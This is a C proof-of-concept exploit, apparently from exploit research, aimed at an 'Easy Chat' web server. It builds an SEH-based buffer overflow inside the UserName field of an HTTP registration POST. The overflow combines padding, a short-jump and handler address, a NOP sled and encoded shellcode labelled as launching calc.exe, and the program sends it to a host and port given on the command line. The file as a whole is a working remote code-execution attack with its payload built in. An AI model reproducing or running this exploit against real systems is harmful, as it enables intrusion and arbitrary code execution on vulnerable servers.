// Author @w4fz5uck5
// Disable warning [4996] at: VS -> Project options -> C/C++ -> Advanced -> Ignore warning...
// inet_addr() problem.. :/

#include "pch.h"
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char *argv[]) {
	printf("|=---> Usage ./easychat.exe <host> <port>\n");

	if (argc < 3) {
		printf("[-] Failed to get arguments!\n");
		return 1;
	}

	char *HOST = argv[1];
	int PORT = atoi(argv[2]);

	// banner
	printf("[*] Easy chat exploit!\n[+] Targets!\n[!] -> %s\n[!] -> %d\n", HOST, PORT);

	// jmp_esp addr
	char nseh[] = "\xEB\x06\x90\x90";
	char seh[] = "\xB4\x89\x01\x10"; 
	char jmp_esp[] = "\x92\x18\x01\x10"; 

	// 24 nops (padding)
	char nops[] = 
		"\x90\x90\x90\x90"
		"\x90\x90\x90\x90"
		"\x90\x90\x90\x90"
		"\x90\x90\x90\x90"
		"\x90\x90\x90\x90"
		"\x90\x90\x90\x90";

	// calc.exe
	char sc[] =
		"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
		"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
		"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
		"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
		"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
		"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
		"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
		"\x1c\x39\xbd";

	// xpl part 1
	char xpl_1[] =
		"POST /registresult.htm HTTP/1.1\r\n\r\n"
		"Host: 192.168.1.11\r\n"
		"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		"Accept-Language: en-US,en;q=0.5\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"Referer: http://192.168.1.11/register.ghp\r\n"
		"Connection: close\r\n"
		"Content-Type: application/x-www-form-urlencoded\r\n"
		"UserName=";
	
	// crash
	char buf[1025] = {};
	// fuzz
	// memset(buf, 'A', 1025);
	
	// debruijn sequence
	// strncpy(buf, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B", 1024);
	memset(buf, 'A', 221 - 4);
	strncat(buf + strlen(buf), nseh, 4);
	strncat(buf + strlen(buf), seh, 4);
	strncat(buf + strlen(buf), nops, 24);
	strncat(buf + strlen(buf), sc, strlen(sc));
	memset(buf + strlen(buf), 'A', 1025 - strlen(buf));
	buf[1024] = '\0';
	
	// xpl final part
	char xpl_2[] = "&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register\r\n";

	char xpl_3[4096];

	strncpy(xpl_3 , xpl_1 ,sizeof(xpl_1));
	strncat(xpl_3, buf, 1024);
	strncat(xpl_3, xpl_2, sizeof(xpl_2));
	strncat(xpl_3, "\0", 1);

	printf("[+] Buffer: %#x\n", &buf);

	int iResult;
	WSADATA wsaData;

	SOCKET ConnectSocket = INVALID_SOCKET;
	struct sockaddr_in clientService;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.

	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr(HOST);
	clientService.sin_port = htons(PORT);

	// Connect to server.
	iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		printf("connect failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	printf("[+] Connected on remote server!\n");

	// Send an initial buffer
	iResult = send(ConnectSocket, xpl_3, (int)strlen(xpl_3), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	printf("[+] Exploit sent!\n....\n[+] BOOM !!\n");
	
	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		wprintf(L"shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	// close the socket
	iResult = closesocket(ConnectSocket);
	if (iResult == SOCKET_ERROR) {
		wprintf(L"close failed with error: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;
}
